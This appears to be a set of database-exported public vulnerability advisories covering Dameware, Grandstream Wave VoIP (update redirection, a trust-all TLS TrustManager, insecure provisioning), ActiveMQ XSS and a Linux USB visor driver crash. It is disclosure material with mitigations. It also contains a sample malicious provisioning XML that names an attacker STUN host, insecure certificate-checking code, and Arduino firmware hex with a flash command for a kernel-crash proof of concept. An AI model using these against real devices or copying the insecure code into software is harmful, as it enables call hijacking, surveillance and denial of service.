2016-03-17: Coordinated Public Disclosure with US-CERT
Affected Product(s):
====================
Solarwinds Dameware Mini Remote Control 12.0 ( previous versions have not been verified )
Severity Level:
===============
High
Proof of Concept (PoC):
=======================
A proof of concept will not be provided at this time.
Solution - Fix & Patch:
=======================
There is currently no patch. Please block remote access to port 6129 at a minimum.
Security Risk:
==============
The security risk of this remote code execution vulnerability is estimated as high. (CVSS 10.0)
Credits & Authors:
==================
Securifera, Inc - b0yd
Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Securifera disclaims all warranties, either expressed or implied,
including the warranties of merchantability and capability for a particular purpose. Securifera is not liable in any case of damage,
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Securifera or its suppliers have been advised
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, or hack into any systems.
Domains: www.securifera.com
Contact: contact [at] securifera [dot] com
Social: twitter.com/securifera
Copyright � 2016 | Securifera, Inc"
3256,CVE-2016-1520: GrandStream Android VoIP App Update Redirection,,CVE-2016-1520,"CVE-2016-1520: GrandStream Android VoIP App Update Redirection
==============================================================
Affected app: [Grandstream Wave][GSWAVE] version 1.0.1.26 (and probably earlier)
Classification:
* [CWE-300 Channel Accessible by Non-Endpoint][CWE300]
* [CWE-319 Cleartext Transmission of Sensitive Information][CWE319]
* CVSS:3.0/AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H (score 6.4)
## Summary
The Grandstream Wave app periodically queries the Grandstream server for app
updates. If a new update is found, the app shows a notification to the user
that either opens the app's Google Play page or auto-downloads the APK file
and opens it for installation.
The update information is downloaded over an insecure connection from
`media.ipvideotalk.com` and contains the version code and the update URL.
An active attacker can redirect this request and trick the user into
downloading a malicious update package. Users that have ""Unknown Sources""
enabled in the Android security preferences, or enable it upon request, can be
tricked into installing a malicious application that disguises itself as a
Wave update.
## Details
The Grandstream Wave app downloads an update info XML on each app start. The
address is hardcoded in the application properties as follows:
updateinfo_serverurl=http://media.ipvideotalk.com/upgrade/updateinfo.xml
This file was last updated in March 2015 and contains the following outdated
information:
<?xml version=""1.0"" encoding=""utf-8""?>
<info>
<version>1.0.1.6</version>
<versioncode>69</versioncode>
<updateurl>market://details?id=com.softphone</updateurl>
<description>检测到最新版本，请及时更新！</description>
</info>
The version available via Google Play at time of this writing is 1.0.1.26
(versioncode 89), therefore no update dialog will be shown by the application.
Internally, the XML is processed by the app as follows:
1. Check if the received `versioncode` is higher than the app's.
2. Prompt the user to install the update.
3. If the `updateurl` contains `""market://details""`, open the Google Play page
for the app's package (this is secure, the URL from the XML is not used).
4. Otherwise, download the file linked to by `updateurl` to
`/sdcard/GSWave/upgrade/GSWave.apk` and open an installation
dialog.
5. If the user has ""Unknown Sources"" disabled, a warning dialog will be shown
that forwards the user to the Android Security Preferences. If
the user taps ""Settings"" and enables ""Unknown Sources"", the next update
attempt will continue to step 6.
6. If ""Unknown Sources"" are allowed, Android will proceed with the app
installation. For a normal user it is almost impossible to distinguish an
official upgrade from a disguised malicious app.
As from the user's perspective this is an update to a trustworthy app, which
was initiated by the app itself, there is no reason to mistrust the
installation and to question the permissions asked by the installer.
## Impact
With a one-time Man-in-the-Middle attack, it is possible to trick the user into
installing a malicious Android application with permissions to make phone
calls, access the contact data, recording audio and video and much more. Such
an application can perform extensive surveillance of the user afterwards.
## Mitigation
It is not possible to disable update checks in the Wave application. Therefore,
no technical mitigation mechanisms are possible. However, the following steps
can be undertaken to reduce risk:
* Do not launch the Wave app on untrusted networks
* Use an automatic VPN connection to a trusted network
* Disable ""Unknown Sources"" in the Android security settings
* Inform the users not to install apps manually
## Timeline
* 2015-11-25 Discovery of the issue
* 2015-11-25 Requested CVE number
* 2015-12-01 Notification of vendor
* 2016-01-20 CVE number assigned
* 2016-03-16 Public disclosure
## Contact
Please contact Dr. Georg Lukas with any further questions regarding this
vulnerability.
PDF version with images: http://rt-solutions.de/images/PDFs/Veroeffentlichungen/CVE-2016-1520-app-update-redirection.pdf
[GSWAVE]: https://play.google.com/store/apps/details?id=com.softphone
[CWE300]: https://cwe.mitre.org/data/definitions/300.html
[CWE319]: https://cwe.mitre.org/data/definitions/319.html
--
Dr.-Ing. Georg Lukas
rt-solutions.de GmbH
Oberländer Ufer 190a
D-50968 Köln
Tel. : (+49)221 93724 16
Fax : (+49)221 93724 50
Mobil: (+49)179 4176591
Web : www.rt-solutions.de
rt-solutions.de
experts you can trust.
Sitz der Gesellschaft: Köln
Eingetragen beim Amtsgericht Köln: HRB 52645
Geschäftsführer: Prof. Dr. Ralf Schumann, Dr. Stefan Schemmer"
3257,CVE-2016-1519: GrandStream Android VoIP App TLS MitM Vulnerability,,CVE-2016-1519,"CVE-2016-1519: GrandStream Android VoIP App TLS MitM Vulnerability
==================================================================
Affected app: [Grandstream Wave][GSWAVE] version 1.0.1.26 (and probably
earlier)
Classification: [CWE-295 Improper Certificate Validation][CWE295]
## Summary
The Grandstream VoIP products deploy a remote provisioning mechanism that
allows to automatically set configuration elements on app startup. By
default, an insecure connection to `fm.grandstream.com` is used to obtain
the
provisioning profile ([CVE-2016-1518][CVE-2016-1518]). However, even if an
HTTPS URL is
configured, the certificate is not validated, allowing an active attacker to
successfully impersonate the provisioning server with an invalid,
mismatching
or outdated certificate. Based on that, the attacker can elevate
[CVE-2016-1518][CVE-2016-1518]
to redirect phone calls through a malicious server, or turn the phone into a
bug. The changes are stored locally, so a single successful
attack is sufficient to gain permanent control of the app.
## Details
When accessing HTTP/HTTPS URLs, the Grandstream Wave app is using a custom
HTTP connection manager in the `com.softphone.common` package. That class is
deploying both a custom [TrustManager][TM] and a custom
[HostnameVerifier][HV]
(the depicted variable and class names have been changed as part of the
deobfuscation):
private static TrustManager[] tm = new TrustManager[]{ new TM(null)
};
private static HostnameVerifier hv = new HV();
...
SSLContext sc = SSLContext.getInstance(""SSL"");
sc.init(null, tm, new SecureRandom());

HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
HttpsURLConnection.setDefaultHostnameVerifier(hv);
The custom TrustManager skips all verification, essentially accepting any
certificate for any connection:
class TM implements X509TrustManager {
public void checkClientTrusted(X509Certificate[] c, String
at) {}
public void checkServerTrusted(X509Certificate[] c, String
at) {}
public X509Certificate[] getAcceptedIssuers() {
return new X509Certificate[0];
}
}
The custom HostnameVerifier does not verify if the server certificate
corresponds to the hostname the connection was made to, allowing to present
the client with a certificate issued for a different hostname:
class HV implements HostnameVerifier {
public boolean verify(String hostname, SSLSession session) {
/* skipped log output */
return true;
}
}
Each of these two issues individually allow an active MitM attacker (e.g. in
a
public WiFi network) to hijack the connection, either by presenting a
self-signed certificate or by presenting a valid certificate issued to an
attacker-controlled domain.
## Impact
Even if the app is configured to use HTTPS for the provisioning server, an
active attacker can trick it into obtaining a provisioning file from an
attacker-controlled sserver, and thus to leverage
[CVE-2016-1518][CVE-2016-1518]:
* Adding or replacing VoIP accounts / servers
* Turning the phone into a bug by setting a ""silent"" ringtone and enabling
auto-answer
* Changing the Config Server Path URL to a server controlled by the
attacker,
allowing to push new configuration after the initial Man-in-the-Middle
attack
## Mitigation
On the Wave app, the only way to close the issue is by disabling remote
provisioning. This can be achieved by entering an empty URL:
1. Open ""GSWave""
2. Switch to the ""Settings"" tab
3. Open ""Advanced Settings"" menu
4. Set ""Config Server Path"" to an empty string
After disabling / securing the auto-provisioning, **all configuration
elements** should be checked for prior manipulation, e.g. by exporting and
inspecting the configuration file.
## Timeline
* 2015-11-24 Discovery of the issue
* 2015-11-25 Requested CVE number
* 2015-12-01 Notification of vendor
* 2016-01-20 CVE number assigned
* 2016-03-16 Public disclosure
## Contact
Please contact Dr. Georg Lukas with any further questions regarding this
vulnerability.
PDF version:
http://rt-solutions.de/images/PDFs/Veroeffentlichungen/CVE-2016-1519-gswave-
tls-mitm.pdf
[CVE-2016-1518]:
http://rt-solutions.de/images/PDFs/Veroeffentlichungen/CVE-2016-1518-insecur
e-provisioning.pdf
[GSWAVE]: https://play.google.com/store/apps/details?id=com.softphone
[TM]:
http://developer.android.com/reference/javax/net/ssl/X509TrustManager.html
[HV]:
http://developer.android.com/reference/javax/net/ssl/HostnameVerifier.html
[CWE295]: https://cwe.mitre.org/data/definitions/295.html
--
Dr.-Ing. Georg Lukas
rt-solutions.de GmbH
Oberländer Ufer 190a
D-50968 Köln
Tel. : (+49)221 93724 16
Fax : (+49)221 93724 50
Mobil: (+49)179 4176591
Web : www.rt-solutions.de
rt-solutions.de
experts you can trust.
Sitz der Gesellschaft: Köln
Eingetragen beim Amtsgericht Köln: HRB 52645
Geschäftsführer: Prof. Dr. Ralf Schumann, Dr. Stefan Schemmer"
3258,CVE-2016-1518: GrandStream Android VoIP Phone / App Provisioning Vulnerability,,CVE-2016-1518,"CVE-2016-1518: GrandStream Android VoIP Phone / App Provisioning
Vulnerability
============================================================================
==
Affected app: [Grandstream Wave][GSWAVE] version 1.0.1.26 (and probably
earlier)
Affected device: [Grandstream GXV3275][GXV3275] Android desk phone, version
1.0.3.55 (probably others as well)
Classification:
* [CWE-300 Channel Accessible by Non-Endpoint][CWE300]
* [CWE-319 Cleartext Transmission of Sensitive Information][CWE319]
* CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (score 8.1)
## Summary
The Grandstream VoIP products deploy a remote provisioning mechanism that
allows to automatically set configuration elements on phone/app startup. By
default, an insecure connection to `fm.grandstream.com` is used to obtain
the
provisioning profile. An active attacker can redirect this request and
change
arbitrary values of the configuration. This allows to redirect phone calls
through a malicious server, turn the phone into a bug, change passwords, and
exfiltrate system logs (including the phone numbers dialed by the user).
The
changes are stored locally, so a single successful attack is sufficient to
gain permanent control of the device.
## Details
Grandstream devices are meant to be deployed in corporate environments,
where
central manageability is key. Therefore, they offer an auto-provisioning
mechanism that allows central configuration of the VoIP and administrative
settings, both in the physical products (Android-based desk phones like the
GXV3275), and in the app deployed via Google Play ([Grandstream
Wave][GSWAVE]).
The auto-provisioning works by regularly downloading certain configuration
files from a URL that is internally configured as the *Config Server Path*.
The default *Config Server Path* is `http://fm.grandstream.com/gs/` which
causes the phone/app to request provisioning data over an insecure channel
from a server operated by Grandstream.
The desk phone downloads the configuration every 60 seconds, the app once on
launch. Multiple configuration files are requested from the server, to allow
specific and generic configuration:
* `cfg<MAC>` (desk phone only)
* `cfg<MAC>.xml` (desk phone and app)
* `cfg.xml` (desk phone and app)
`cfg<MAC>` is a plaintext file containing key-value pairs, `cfg*.xml` are
XML
files based on a similar key-value schema. `<MAC>` is the MAC address of the
device, without byte delimiters.
Passive attackers can obtain the MAC address of the device running the VoIP
application, as well as eventual provisioning elements returned by the
server.
Active attackers can perform a Man-in-the-Middle attack (e.g. by means of
ARP
spoofing or DNS poisoning) to redirect the request to a maliciously crafted
configuration file, re-provisioning the phone with new settings.
## Impact
The provisioning file can change any aspect of the VoIP functionality. It
contains key-value pairs for different options (Pxxx), e.g. the following to
change the admin password (P2) and to redirect STUN traffic (P76):
<?xml version=""1.0"" encoding=""UTF-8"" ?>
<gs_provision version=""1"">
<config version=""1"">
<P2>haha-pwn3d</P2>
<P76>stun.mallory.evil</P76>
</config>
</gs_provision>
The GXV3275 phone has over 1600 different settings that can be configured
this
way, including:
* Changing of admin and user passwords
* Adding or replacing VoIP accounts / servers
* Turning the phone into a bug by setting a ""silent"" ringtone and enabling
auto-answer
* Enabling syslog logging to an attacker-controlled server
* Changing the Config Server Path URL to a server controlled by the
attacker,
allowing to push new configuration after the initial Man-in-the-Middle
attack
A full list of configuration options for different devices is available in
the
""Configuration Template"" on the [GrandStream server][GSTOOLS].
## Mitigation
On the Wave app, the only way to close the issue is by disabling remote
provisioning. This can be achieved by entering an empty URL:
1. Open ""GSWave""
2. Switch to the ""Settings"" tab
3. Open ""Advanced Settings"" menu
4. Set ""Config Server Path"" to an empty string
On the GXV3275 desk phone, it is also possible to deploy secure provisioning
by switching the provisioning mode to HTTPS and enabling certificate chain
validation.
1. Open the administrative web interface
2. Switch to the ""Maintenance"" tab
3. Select the ""Upgrade"" menu
4. Set ""Validate Certificate Chain"" to ""**Yes**""
5. Set ""Upgrade Via"" to ""**HTTPS**""
After disabling / securing the auto-provisioning, **all configuration
elements** should be checked for prior manipulation, e.g. by exporting and
inspecting the phone configuration file.
## Timeline
* 2015-11-24 Discovery of the issue
* 2015-11-24 Requested CVE number
* 2015-12-01 Notification of vendor
* 2016-01-20 CVE number assigned
* 2016-03-16 Public disclosure
## Contact
Please contact Dr. Georg Lukas with any further questions regarding this
vulnerability.
PDF version:
http://rt-solutions.de/images/PDFs/Veroeffentlichungen/CVE-2016-1518-insecur
e-provisioning.pdf
[GSWAVE]: https://play.google.com/store/apps/details?id=com.softphone
[GXV3275]:
http://www.grandstream.com/products/ip-video-telephony/ip-video-phones-andro
id/product/gxv3275
[GSTOOLS]: http://www.grandstream.com/support/tools
[CWE300]: https://cwe.mitre.org/data/definitions/300.html
[CWE319]: https://cwe.mitre.org/data/definitions/319.html
--
Dr.-Ing. Georg Lukas
rt-solutions.de GmbH
Oberländer Ufer 190a
D-50968 Köln
Tel. : (+49)221 93724 16
Fax : (+49)221 93724 50
Mobil: (+49)179 4176591
Web : www.rt-solutions.de
rt-solutions.de
experts you can trust.
Sitz der Gesellschaft: Köln
Eingetragen beim Amtsgericht Köln: HRB 52645
Geschäftsführer: Prof. Dr. Ralf Schumann, Dr. Stefan Schemmer"
3302,[ANNOUNCE] CVE-2016-0782: ActiveMQ Web Console - Cross-Site Scripting,,CVE-2016-0782,"There following security vulnerability was reported against Apache
ActiveMQ 5.13.0 and older versions.
Please check the following document and see if you’re affected by the issue.
http://activemq.apache.org/security-advisories.data/CVE-2016-0782-announcement.txt
Apache ActiveMQ 5.13.1 and newer with appropriate fixes was released and
available for upgrade."
3322,OS-S 2016-10 Linux visor (treo_attach) Nullpointer Dereference CVE-2016-2782,,CVE-2016-2782,"OS-S Security Advisory 2016-10
Linux visor (treo_attach) Nullpointer Dereference
Date: March 4th, 2016
Authors: Sergej Schumilo, Hendrik Schwartke, Ralf Spenneberg
CVE: CVE-2016-2782
CVSS: 4.9 (AV:L/AC:L/Au:N/C:N/I:N/A:C)
Title: Local RedHat Enterprise Linux DoS – RHEL 7.1 Kernel crashes on invalid
USB device descriptors (visor treo_attach driver)
Severity: Critical. The Kernel panics. A reboot is required.
Ease of Exploitation: Trivial
Vulnerability type: Wrong input validation
Products: RHEL 7.1 including all updates
Kernel-Version: 3.10.0-229.20.1.el7.x86_64 (for debugging-purposes we used the
CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7)
Vendor: Red Hat
Vendor contacted: November, 12th 2015
PDF of advisory: https://os-s.net/advisories/OSS-2016-10_visor_treo_attach.pdf
Abstract:
The Kernel 3.10.0-229.20.1.el7.x86_64 crashes on presentation of a buggy USB
device requiring the visor (treo_attach) driver.
Detailed product description:
We confirmed the bug on the following system:
RHEL 7.1
Kernel 3.10.0-229.20.1.el7.x86_64
Further products or kernel versions have not been tested.
How reproducible: Always
Actual results: Kernel crashes.
Description:
The bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo
(github.com/schumilo) using the following device descriptor:
[*] Device-Descriptor
bLength: 0x12
bDescriptorType: 0x1
bcdUSB: 0x200
bDeviceClass: 0x3
bDeviceSubClass: 0x0
bDeviceProtocol: 0x0
bMaxPacketSize: 0x40
idVendor: 0x82d
idProduct: 0x200
bcdDevice: 0x100
iManufacturer: 0x1
iProduct: 0x2
iSerialNumbers: 0x3
bNumConfigurations: 0x1
The treo_attach function does not use the num_ports (struct usb_serial) value
for any kind of sanity checks during the initialization process. Due to an
incomplete sanity check, the driver could try to dereference a null-pointer if
a malformed device-descriptor is presented (zero-value for bNumEndpoints or no
required endpoint-descriptors is provided).
This results in a crash of the system.
****
...
554 #define COPY_PORT(dest, src)
555 do {
556 int i;
557
558 for (i = 0; i < ARRAY_SIZE(src->read_urbs); ++i) {
559 dest->read_urbs[i] = src->read_urbs[i]; /* Possible
Nullpointer-Dereference */
560 dest->read_urbs[i]->context = dest;
561 dest->bulk_in_buffers[i] = src->bulk_in_buffers[i];
562 }
563 dest->read_urb = src->read_urb;
564 dest->bulk_in_endpointAddress = src->bulk_in_endpointAddress;
565 dest->bulk_in_buffer = src->bulk_in_buffer;
566 dest->bulk_in_size = src->bulk_in_size;
567 dest->interrupt_in_urb = src->interrupt_in_urb;
568 dest->interrupt_in_urb->context = dest;
569 dest->interrupt_in_endpointAddress =
570 src->interrupt_in_endpointAddress;
571 dest->interrupt_in_buffer = src->interrupt_in_buffer;
572 } while (0);
573
574 swap_port = kmalloc(sizeof(*swap_port), GFP_KERNEL);
575 if (!swap_port)
576 return -ENOMEM;
577 COPY_PORT(swap_port, serial->port[0]); /* no sanity-check! */
578 COPY_PORT(serial->port[0], serial->port[1]); /* no sanity-check! */
579 COPY_PORT(serial->port[1], swap_port); /* no sanity-check! */
...
****
[*] Configuration-Descriptor
bLength: 0x9
bDescriptorType: 0x2
wTotalLength: 0x27
bNumInterfaces: 0x1
bConfigurationValue: 0x1
iConfiguration: 0x0
bmAttributes: 0x0
bMaxPower: 0x31
[*] Interface-Descriptor
bLength: 0x9
bDescriptorType: 0x4
bInterfaceNumber: 0x0
bAlternateSetting: 0x0
bNumEndpoints: 0x3
bInterfaceClass: 0x0
bInterfaceSubClass: 0x0
bInterfaceProtocol: 0x0
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x81
bmAttribut: 0x3
wMaxPacketSize: 0x404
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x1
bmAttribut: 0x2
wMaxPacketSize: 0x4
bInterval: 0xc
[*] Endpoint-Descriptor:
bLength: 0x7
bDescriptorType: 0x5
bEndpointAddress: 0x82
bmAttribut: 0x1
wMaxPacketSize: 0x4
bInterval: 0xc
Proof of Concept:
For a proof of concept, we are providing an Arduino Leonardo firmware file. This
firmware will emulate the defective USB device.
avrdude -v -p ATMEGA32u4 -c avr109 -P /dev/ttyACM0 -b 57600 -U
flash:w:binary.hex
The firmware has been attached to this bug report.
To prevent the automated delivery of the payload, a jumper may be used to
connect port D3 and 3V3!
Severity and Ease of Exploitation:
The vulnerability can be easily exploited. Using our Arduino Leonardo firmware,
only physical access to the system is required.
Vendor Communication:
We contacted Red Hat on the November, 12th 2015.
This bug was fixed upstream. A CVE number was not assigned.
References:
https://bugzilla.redhat.com/show_bug.cgi?id=1283374
http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=cac9b50b0d75a1d50d6c056ff65c005f3224c8e0
Kernel Stacktrace:
[ 35.176832] usb 1-1: new full-speed USB device number 2 using xhci_hcd
[ 35.400183] usb 1-1: New USB device found, idVendor=082d, idProduct=0200
[ 35.407780] usb 1-1: New USB device strings: Mfr=1, Product=2,
SerialNumber=3
[ 35.417186] usb 1-1: Product: ĉ
[ 35.421846] usb 1-1: Manufacturer: ĉ
[ 35.425686] usb 1-1: SerialNumber: %
[ 35.438608] usb 1-1: ep 0x81 - rounding interval to 64 microframes, ep desc
says 96 microframes
[ 35.493316] usbcore: registered new interface driver visor
[ 35.503150] usbserial: USB Serial support registered for Handspring Visor /
Palm OS
[ 35.512980] usbserial: USB Serial support registered for Sony Clie 5.0
[ 35.521056] usbserial: USB Serial support registered for Sony Clie 3.5
[ 35.535245] visor 1-1:1.0: Handspring Visor / Palm OS converter detected
[ 35.542409] BUG: unable to handle kernel NULL pointer dereference at
00000000000000b0
[ 35.543244] IP: [<ffffffffa0393651>] treo_attach+0x61/0x340 [visor]
[ 35.543244] PGD 0
[ 35.543244] Oops: 0002 [#1] SMP
[ 35.543244] Modules linked in: visor(+) ip6t_rpfilter ip6t_REJECT ipt_REJECT
xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables
ip6table_nat nf_conntrack_ipv6 nf_defrag_ipv6 nf_nat_ipv6 ip6table_mangle
ip6table_security ip6table_raw ip6table_filter ip6_tables iptable_nat
nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 nf_nat nf_conntrack
iptable_mangle iptable_security iptable_raw iptable_filter ip_tables bochs_drm
ppdev syscopyarea sysfillrect sysimgblt ttm drm_kms_helper drm pcspkr i2c_piix4
i2c_core serio_raw parport_pc parport xfs libcrc32c sd_mod sr_mod crc_t10dif
cdrom crct10dif_common ata_generic pata_acpi ata_piix libata e1000 floppy
dm_mirror dm_region_hash dm_log dm_mod
[ 35.543244] CPU: 0 PID: 2220 Comm: systemd-udevd Not tainted
3.10.0-229.14.1.el7.x86_64 #1
[ 35.543244] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014
[ 35.543244] task: ffff88000bcfa220 ti: ffff88000bd20000 task.ti: ffff88000bd20000
[ 35.543244] RIP: 0010:[<ffffffffa0393651>] [<ffffffffa0393651>]
treo_attach+0x61/0x340 [visor]
[ 35.543244] RSP: 0018:ffff88000bd23a78 EFLAGS: 00010286
[ 35.543244] RAX: ffff88000003c000 RBX: ffff88000af979c0 RCX: 000000000000a0e2
[ 35.543244] RDX: 0000000000000000 RSI: 00000000000000d0 RDI: ffff88000e401400
[ 35.543244] RBP: ffff88000bd23a80 R08: 00000000000164c0 R09: ffff88000e401400
[ 35.543244] R10: ffffffffa0393636 R11: ffff88000bcd0000 R12: 0000000000000404
[ 35.543244] R13: ffff88000be6b000 R14: ffff88000af979c0 R15: ffffffffa0395400
[ 35.543244] FS: 00007fb8082b4880(0000) GS:ffff88000fc00000(0000)
knlGS:0000000000000000
[ 35.543244] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b
[ 35.543244] CR2: 00000000000000b0 CR3: 000000000c51f000 CR4:
00000000000006f0
[ 35.543244] DR0: 0000000000000000 DR1: 0000000000000000 DR2:
0000000000000000
[ 35.543244] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[ 35.543244] Stack:
[ 35.543244] ffff88000bcd0090 ffff88000bd23c18 ffffffff8145fed1 0000000000000007
[ 35.543244] 000000020bd23af8 ffff88000c525830 0000000100000000 ffffffffa0395400
[ 35.543244] 0000010000000001 ffff88000bcd0000 0000000000000100
ffff88000bcd0090
[ 35.543244] Call Trace:
[ 35.543244] [<ffffffff8145fed1>] usb_serial_probe+0xdb1/0x1230
[ 35.543244] [<ffffffff812d649c>] ? ida_get_new_above+0x7c/0x2a0
[ 35.543244] [<ffffffff811aba6a>] ? kmem_cache_alloc+0x1ba/0x1d0
[ 35.543244] [<ffffffff8123e5b2>] ? sysfs_addrm_finish+0x42/0xe0
[ 35.543244] [<ffffffff8123e391>] ? __sysfs_add_one+0x61/0x100
[ 35.543244] [<ffffffff8141dc04>] usb_probe_interface+0x1c4/0x2f0
[ 35.543244] [<ffffffff813d30d7>] driver_probe_device+0x87/0x390
[ 35.543244] [<ffffffff813d34b3>] __driver_attach+0x93/0xa0
[ 35.543244] [<ffffffff813d3420>] ? __device_attach+0x40/0x40
[ 35.543244] [<ffffffff813d0e43>] bus_for_each_dev+0x73/0xc0
[ 35.543244] [<ffffffff813d2b2e>] driver_attach+0x1e/0x20
[ 35.543244] [<ffffffff8145ec4b>] usb_serial_register_drivers+0x29b/0x580
[ 35.543244] [<ffffffffa0398000>] ? 0xffffffffa0397fff
[ 35.543244] [<ffffffffa039801e>] usb_serial_module_init+0x1e/0x1000 [visor]
[ 35.543244] [<ffffffff810020e8>] do_one_initcall+0xb8/0x230
[ 35.543244] [<ffffffff810dd0ee>] load_module+0x133e/0x1b40
[ 35.543244] [<ffffffff812f7d60>] ? ddebug_proc_write+0xf0/0xf0
[ 35.543244] [<ffffffff810d96b3>] ? copy_module_from_fd.isra.42+0x53/0x150
[ 35.543244] [<ffffffff810ddaa6>] SyS_finit_module+0xa6/0xd0
[ 35.543244] [<ffffffff81614389>] system_call_fastpath+0x16/0x1b
[ 35.543244] Code: e1 ba 50 05 00 00 be d0 00 00 00 e8 4a 84 e1 e0 48 85 c0
0f 84 e1 02 00 00 48 8b 53 20 48 8b 92 b8 01 00 00 48 89 90 b8 01 00 00 <48>
89 82 b0 00 00 00 48 8b 53 20 48 8b 92 a8 01 00 00 48 89 90
[ 35.543244] RIP [<ffffffffa0393651>] treo_attach+0x61/0x340 [visor]
[ 35.543244] RSP <ffff88000bd23a78>
[ 35.543244] CR2: 00000000000000b0
[ 35.973188] ---[ end trace b239663354a1c556 ]---
[ 35.978862] Kernel panic - not syncing: Fatal exception
[ 35.979835] drm_kms_helper: panic occurred, switching back to text console
Arduino Leonardo Firmware:
:100000000C94A8000C94C5000C94C5000C94C50079
:100010000C94C5000C94C5000C94C5000C94C5004C
:100020000C94C5000C94C5000C94C4050C942F04CA
:100030000C94C5000C94C5000C94C5000C94C5002C
:100040000C94C5000C94C5000C94C5000C94C5001C
:100050000C94C5000C94C5000C94C5000C940E02C1
:100060000C94C5000C94C5000C94C5000C94C500FC
:100070000C94C5000C94C5000C94C5000C94C500EC
:100080000C94C5000C94C5000C94C5000C94C500DC
:100090000C94C5000C94C5000C94C5000C94C500CC
:1000A0000C94C5000C94C5000C94C5000B030E0302
:1000B000010305032F032F032F03120316031A0353
:1000C000200324032F032A030000000200080E006F
:1000D00000030401000B000000000000000000000D
:1000E00000000000000004080201104080401020C1
:1000F00040804080080204018040201002011080EE
:100100001020404004040404040304050202020217
:1001100004030202020206060606060604040202A0
:100120000204000000002300260029002C002F00FC
:1001300000000000250028002B002E0031000000E8
:100140000000240027002A002D00300000C180811B
:1001500011241FBECFEFDAE0DEBFCDBF15E0A0E077
:10016000B1E0E4EDF3E102C005900D92A436B107D1
:10017000D9F725E0A4E6B5E001C01D92AF37B2077C
:10018000E1F70E94C8000C9404070C940000089545
:10019000CF93DF93CDB7DEB7CD59D1090FB6F89421
:1001A000DEBF0FBECDBF0E94A1020E94C70060E06B
:1001B00083E00E94300361E087E00E94300361E049
:1001C00088E00E9430030E9459067E012AE9E20E6F
:1001D000F11C84E093E0D70111969C938E9389E003
:1001E00094E013969C938E93129782E2E2E1F1E001
:1001F0009E012F5F3F4F6901D90101900D928A95B1
:10020000E1F788E1E4E3F1E0DE01939601900D92DD
:100210008A95E1F782E1ECE4F1E0DE01DB96019002
:100220000D928A95E1F789E0EEE5F1E0DE01A05953
:10023000BF4F01900D928A95E1F72A593F4F99E0FF
:10024000992ED901E92D1D92EA95E9F78E010957FA
:100250001F4F87E0E7E6F1E0D80101900D928A9503
:10026000E1F7BE0160587F4F87E0EEE6F1E0DB0189
:1002700001900D928A95E1F7AE0147585F4F87E0F4
:10028000E5E7F1E0DA0101900D928A95E1F75E0170
:10029000FEE8AF0EB11C86E0ECE7F1E0D50101907D
:1002A0000D928A95E1F7CE01835B9F4FEEE0DC0172
:1002B0001D92EA95E9F7E3E0DC011996EC93D90188
:1002C0009C92F4E01196FC9311971496EC93F9012B
:1002D000DC01292D01900D922A95E1F7FE01EC56E3
:1002E000FF4FDC011B96FC93EE931A971D96BC9270
:1002F000AE921C971183008373836283558344837A
:100300000C5211092CE0F80111922A95E9F721E02D
:10031000D80119962C931997FE01E059FF4F0190CF
:100320000D929A94E1F7F8019387828761E088E063
:100330000E9469038BE492E00E94650688E892E0DF
:100340000E94650687EC92E00E94650686E093E0D5
:100350000E94650682E493E00E9465068FE793E0C1
:100360000E94650684EA93E00E9465068BEE93E0A6
:100370000E94650683E00E949F03892B09F047C015
:100380005E01F3E2AF0EB11C8824839482E1982EC3
:1003900084E194E00E946506BF92AF92DF92CF9213
:1003A000FF92EF921F928F921F930F932DB73EB73C
:1003B000225131090FB6F8943EBF0FBE2DBFADB725
:1003C000BEB71196FE01FB96892D01900D928A957C
:1003D000E1F78DE695E00E94030668E873E180E0AE
:1003E00090E00E947B028DE695E00E944E0660E060
:1003F00087E00E94690368E873E180E090E00E9472
:100400007B020FB6F894DEBF0FBECDBFC1CF6AE04E
:1004100070E080E090E00E947B02ACCF1F920F92D0
:100420000FB60F9211242F933F938F939F93AF9307
:10043000BF938091650590916605A0916705B09185
:1004400068053091640523E0230F2D3720F40196D1
:10045000A11DB11D05C026E8230F0296A11DB11DE7
:10046000209364058093650590936605A0936705C6
:10047000B09368058091690590916A05A0916B051C
:10048000B0916C050196A11DB11D809369059093F3
:100490006A05A0936B05B0936C05BF91AF919F91D6
:1004A0008F913F912F910F900FBE0F901F90189535
:1004B0003FB7F8948091690590916A05A0916B050A
:1004C000B0916C0526B5A89B05C02F3F19F0019689
:1004D000A11DB11D3FBF6627782F892F9A2F620F6C
:1004E000711D811D911D42E0660F771F881F991FA6
:1004F0004A95D1F70895CF92DF92EF92FF92CF9372
:10050000DF936B017C010E945802EB01C114D104FE
:10051000E104F10479F00E9458026C1B7D0B683EE7
:100520007340A0F381E0C81AD108E108F108C8516E
:10053000DC4FECCFDF91CF91FF90EF90DF90CF9029
:100540000895789484B5826084BD84B5816084BD4B
:1005500085B5826085BD85B5816085BDEEE6F0E03C
:10056000808181608083E1E8F0E010828081826098
:100570008083808181608083E0E8F0E08081816019
:100580008083E1E9F0E08081826080838081816006
:100590008083E0E9F0E0808181608083E1ECF0E03D
:1005A000808184608083808182608083808181609B
:1005B0008083E3ECF0E0808181608083E0ECF0E018
:1005C000808182608083E2ECF0E0808181608083C2
:1005D000EAE7F0E0808184608083808182608083AC
:1005E000808181608083808180688083089590E02D
:1005F000FC013197EE30F10590F5EA5AFF4F0C946B
:10060000AB09809180008F7703C0809180008F7D3F
:1006100080938000089584B58F7702C084B58F7D64
